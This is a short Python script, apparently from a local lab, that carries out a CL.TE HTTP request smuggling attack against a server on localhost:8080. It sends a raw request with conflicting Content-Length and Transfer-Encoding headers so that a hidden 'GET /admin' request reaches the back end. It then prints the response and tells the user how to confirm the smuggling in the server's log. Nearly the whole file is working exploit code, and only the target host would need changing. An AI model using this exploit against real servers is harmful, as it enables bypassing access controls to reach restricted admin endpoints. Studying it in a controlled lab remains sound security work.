import socket
import time

def smuggle_attack():
    # CL.TE Attack: Content-Length vs Transfer-Encoding
    request = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost:8080\r\n"
        b"Content-Length: 6\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /admin HTTP/1.1\r\n"
        b"Host: localhost:8080\r\n"
        b"\r\n"
    )

    print("=" * 60)
    print("SENDING SMUGGLED REQUEST")
    print("=" * 60)
    print(request.decode())
    print("=" * 60)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # 5 second timeout
        sock.connect(("localhost", 8080))
        print("✓ Connected to localhost:8080")
        
        sock.sendall(request)
        print("✓ Request sent")
        
        # Get response
        print("\nWaiting for response...")
        response = sock.recv(4096)
        
        if response:
            print("\n=== RESPONSE RECEIVED ===")
            print(response.decode())
            print("=" * 60)
        else:
            print("✗ No response received")
        
        sock.close()
        print("\n✓ Connection closed")
        
    except socket.timeout:
        print("✗ Socket timeout - no response")
    except Exception as e:
        print(f"✗ Error: {e}")

if __name__ == "__main__":
    smuggle_attack()
    
    # Check what the backend logged
    print("\n" + "=" * 60)
    print("Now check Terminal 1 (server.py) for logged requests")
    print("You should see TWO requests if smuggling worked:")
    print("  1. POST /")
    print("  2. GET /admin  <-- This is the smuggled request!")
    print("=" * 60)